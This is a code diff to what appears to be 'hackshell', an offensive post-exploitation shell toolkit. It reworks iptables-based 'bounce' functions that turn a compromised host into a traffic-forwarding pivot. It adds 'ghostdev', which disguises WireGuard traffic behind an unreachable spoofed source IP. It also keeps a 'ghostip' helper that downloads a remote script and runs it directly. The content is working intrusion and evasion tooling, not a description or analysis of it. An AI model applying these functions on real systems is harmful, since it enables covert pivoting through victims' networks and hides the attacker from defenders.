@@ -440,50 +440,75 @@ command -v srm >/dev/null || srm() { shred "$@"; }
 command -v strings >/dev/null || { command -v perl >/dev/null && strings() { LC_ALL=C perl -nle 'print $& while m/[[:print:]]{8,}/g' "$@"; }; }
 command -v strings >/dev/null || { command -v grep >/dev/null && strings() { grep -a -o -E '[[:print:]]{8,}' "$@"; }; }
 
-bounceinit() {
-    [[ -n "$_is_bounceinit" ]] && return
-    _is_bounceinit=1
+_hs_bounceinit_add() {
+    local src="${1:?}"
+    iptables -t mangle -A PREROUTING -s "${src}" -m addrtype --dst-type LOCAL -m conntrack ! --ctstate ESTABLISHED -j MARK --set-mark 1188
+}
+
+_hs_bounceinit() {
+    [ -n "$_is_hs_bounceinit" ] && return
+    _is_hs_bounceinit=1
+
+    # Return if already set (by another hackshell)
+    iptables -t nat -L POSTROUTING -vn | grep -q "mark match 0x4a4" && return
 
     echo 1 >/proc/sys/net/ipv4/ip_forward
     echo 1 >/proc/sys/net/ipv4/conf/all/route_localnet
-    [ $# -le 0 ] && {
-        HS_WARN "Allowing _ALL_ IPs to bounce. Use ${CDC}bounceinit 1.2.3.4/24 5.6.7.8/16 ...${CDM} to limit." 
-        set -- "0.0.0.0/0"
-    }
-    while [ $# -gt 0 ]; do
-        _hs_bounce_src+=("${1}")
-        iptables -t mangle -I PREROUTING -s "${1}" -p tcp -m addrtype --dst-type LOCAL -m conntrack ! --ctstate ESTABLISHED -j MARK --set-mark 1188
-        iptables -t mangle -I PREROUTING -s "${1}" -p udp -m addrtype --dst-type LOCAL -m conntrack ! --ctstate ESTABLISHED -j MARK --set-mark 1188
-        shift 1
-    done
     iptables -t mangle -D PREROUTING -j CONNMARK --restore-mark >/dev/null 2>/dev/null
     iptables -t mangle -I PREROUTING -j CONNMARK --restore-mark
     iptables -I FORWARD -m mark --mark 1188 -j ACCEPT
     iptables -t nat -I POSTROUTING -m mark --mark 1188 -j MASQUERADE
     iptables -t nat -I POSTROUTING -m mark --mark 1188 -j CONNMARK --save-mark
+}
+
+bounceinit() {
+    _hs_bounceinit
+
+    [ $# -le 0 ] && {
+        [ -n "$_is_hs_bounceinit" ] && return # already initialized by another hackshell or by us
+        HS_WARN "Allowing _ALL_ IPs to bounce. Use ${CDC}bounceinit 1.2.3.4/24 5.6.7.8/16 ...${CDM} to limit." 
+        set -- "0.0.0.0/0"
+    }
+
+    while [ $# -gt 0 ]; do
+        _hs_bounce_src+=("${1}")
+        _hs_bounceinit_add "${1}"
+        shift 1
+    done
+    iptables -t mangle -L PREROUTING -vn --line-numbers | grep -F "0x4a4"
     HS_INFO "Use ${CDC}unbounce${CDM} to remove all bounces."
 }
 
 unbounce() {
-    unset _is_bounceinit
+    unset _is_hs_bounceinit
     local str
 
-    for x in "${_hs_bounce_dst[@]}"; do
-        iptables -t nat -D PREROUTING -p tcp --dport "${x%%-*}" -m mark --mark 1188 -j DNAT --to "${x##*-}" 2>/dev/null
-        iptables -t nat -D PREROUTING -p udp --dport "${x%%-*}" -m mark --mark 1188 -j DNAT --to "${x##*-}" 2>/dev/null
+    iptables -t mangle -L PREROUTING -vn --line-numbers | grep -F "0x4a4" | cut -f1 -d" " | tac | while read -r n; do
+        iptables -t mangle -D PREROUTING "${n}"
     done
-    unset _hs_bounce_dst
 
-    for x in "${_hs_bounce_src[@]}"; do
-        iptables -t mangle -D PREROUTING -s "${x}" -p tcp -m addrtype --dst-type LOCAL -m conntrack ! --ctstate ESTABLISHED -j MARK --set-mark 1188
-        iptables -t mangle -D PREROUTING -s "${x}" -p udp -m addrtype --dst-type LOCAL -m conntrack ! --ctstate ESTABLISHED -j MARK --set-mark 1188
+    iptables -t nat -L PREROUTING -vn --line-numbers | grep -F "mark match 0x4a4" | cut -f1 -d" " | tac | while read -r n; do
+        iptables -t nat -D PREROUTING "${n}"
     done
-    unset _hs_bounce_src
+
     iptables -t mangle -D PREROUTING -j CONNMARK --restore-mark >/dev/null 2>/dev/null
     iptables -D FORWARD -m mark --mark 1188 -j ACCEPT 2>/dev/null
     iptables -t nat -D POSTROUTING -m mark --mark 1188 -j MASQUERADE 2>/dev/null
     iptables -t nat -D POSTROUTING -m mark --mark 1188 -j CONNMARK --save-mark 2>/dev/null
     HS_INFO "DONE. Check with ${CDC}iptables -t mangle -L PREROUTING -vn; iptables -t nat -L -vn; iptables -L FORWARD -vn${CN}"
+}
+
+_hs_bounces_show() {
+    local str
+    IFS=$'\n' str=$(iptables -t nat -L PREROUTING -vn | grep -F "mark match 0x4a4")
+    [ -z "$str" ] && return
+    echo -e "\n${CDG}Current bounces:${CN}"
+    echo "$str" | while read -r l; do
+        local proto="$(echo "$l" | awk '{print $4}')"
+        local dport="$(echo "$l" | grep -oE 'dpt:[0-9]+' | cut -d: -f2)"
+        local to="$(echo "$l" | grep -oE 'to:[^ ]+' | cut -d: -f2-)"
+        echo -e "  ${CDC}${proto}:${dport} ${CDM} -> ${CDY}${to}${CN}"
+    done
 }
 
 bounce() {
@@ -493,13 +518,14 @@ bounce() {
     local proto="${4:-tcp}"
     [[ $# -lt 3 ]] && {
         xhelp_bounce
+        _hs_bounces_show
         return 255
     }
     bounceinit
 
     iptables -t nat -A PREROUTING -p "${proto}" --dport "${fport:?}" -m mark --mark 1188 -j DNAT --to "${dstip:?}:${dstport:?}" || return
-    _hs_bounce_dst+=("${fport}-${dstip}:${dstport}")
     HS_INFO "Traffic to _this_ host's ${CDY}${proto}:${fport}${CDM} is now forwarded to ${CDY}${dstip}:${dstport}"
+    _hs_bounces_show
 }
 
 sub() {
@@ -519,6 +545,45 @@ ptr() {
 }
 
 rdns() { ptr "$@"; }
+
+# Make Wireguard use a ghost-ip.
+ghostdev() {
+    local in="${1}"
+    local ghostip="${2}"
+    local out="${3}"
+    [ -z "$out" ] && { echo >&2 "Usage: ghost <in-interface> <ghost-ip> <out-interface>"; return 255; }
+    # Mark all packets arriving from the wg interface (so that we can later SNAT them to a ghost IP).
+    iptables -t mangle -D PREROUTING -i "${in:?}" -j MARK --set-mark 0x8011 2>/dev/null
+    iptables -t mangle -A PREROUTING -i "${in:?}" -j MARK --set-mark 0x8011
+
+    iptables -t nat -D POSTROUTING -o "${out:?}" -m mark --mark 0x8011 -j SNAT --to "${ghostip:?}" 2>/dev/null
+    iptables -t nat -I POSTROUTING -o "${out:?}" -m mark --mark 0x8011 -j SNAT --to "${ghostip:?}"
+    # Make ghost-ip unreachable (using a nat/255.255.255.255 trick)
+    iptables -t nat -D PREROUTING -d "${ghostip}" -m state --state NEW -j DNAT --to 255.255.255.255 2>/dev/null
+    iptables -t nat -I PREROUTING -d "${ghostip}" -m state --state NEW -j DNAT --to 255.255.255.255
+
+    # Add the ghost IP to the out interface (so that ARP resolution works).
+    ip addr add "${ghostip}/32" dev "${out}" label "perm $out"
+    iptables -t mangle -L PREROUTING -vn | grep -F "0x8011"
+}
+
+unghostdev() {
+    iptables -t mangle -L PREROUTING -vn --line-numbers | grep -F "0x8011" | cut -f1 -d" " | tac | while read -r n; do
+        iptables -t mangle -D PREROUTING "${n}"
+    done
+    iptables -t nat -L POSTROUTING -vn --line-numbers | grep -F "0x8011" | cut -f1 -d" " | tac | while read -r n; do
+        iptables -t nat -D POSTROUTING "${n}"
+    done
+    iptables -t nat -L PREROUTING -vn --line-numbers | grep -F "255.255.255.255" | cut -f1 -d" " | tac | while read -r n; do
+        iptables -t nat -D PREROUTING "${n}"
+    done
+    iptables -t nat -D PREROUTING -d "${ghostip}" -m state --state NEW -j DNAT --to 255.255.255.255 2>/dev/null
+    ip addr show | grep 'inet ' | grep perm | while read -r l; do
+        local ip="$(echo "$l" | awk '{print $2}')"
+        local dev="${l##*perm }"
+        ip addr del "${ip:?}" dev "${dev:?}"
+    done
+}
 
 ghostip() {
     source <(dl https://github.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/raw/master/tools/ghostip.sh)
@@ -911,8 +976,8 @@ _bin_single() {
         # Only create busybox-bins for bins that do not yet exist.
         busybox --list | while read -r fn; do
             command -v "$fn" >/dev/null && continue
-            [ -e "${XHOME}/${fn}" ] && continue
-            ln -s "busybox" "${XHOME}/${fn}"
+            [ -e "${XHOME}/bin/${fn}" ] && continue
+            ln -s "busybox" "${XHOME}/bin/${fn}"
         done
     }
     [ -n "$single" ] && [ -z "$_HS_SINGLE_MATCH" ] && {
@@ -1432,7 +1497,7 @@ _ebsock() {
         return
     }
 
-    _HS_EBSOCK=$(grep -Eom1 '@(event-[a-zA-Z0-9]{10}|/dev/(event|stats)-[a-zA-Z0-9]{10}|UDEV-[a-zA-Z0-9]{8}|/run/systemd/log|/proc/udevd)' /proc/net/unix)
+    _HS_EBSOCK=$(grep -Eom1 '@(event-[a-zA-Z0-9]{10}|/dev/(event|stats)-[a-zA-Z0-9]{10}|UDEV-[a-zA-Z0-9]{8}|/run/systemd/log|/proc/udevd)' /proc/net/unix 2>/dev/null)
     # /tmp/dbus-[a-zA-Z0-9]{10} can occur naturally so check that it's just 1.
     [ -z "$_HS_EBSOCK" ] && _HS_EBSOCK=$(grep -E '@/tmp/dbus-[a-zA-Z0-9]{10}' /proc/net/unix | sed 's|.*@||g'  | sort | uniq -c | grep " 1 " | awk '{print $2}' | head -n1)
     [ -z "$_HS_EBSOCK" ] && {
@@ -2222,7 +2287,7 @@ ttyinject() {
 
 hs_exit() {
     cd /tmp || cd /dev/shm || cd /
-    [ "${#_hs_bounce_src[@]}" -gt 0 ] && HS_WARN "Bounce still set in iptables. Type ${CDC}unbounce${CN} to stop the forward."
+    [ -n "$_is_hs_bounceinit" ] && HS_WARN "Bounce still set. Type ${CDC}unbounce${CN} to stop the forward."
     [ -n "$XHOME" ] && [ -d "$XHOME" ] && {
         if [ -f "${XHOME}/.keep" ]; then
             HS_WARN "Keeping ${CDY}${XHOME}${CN}"
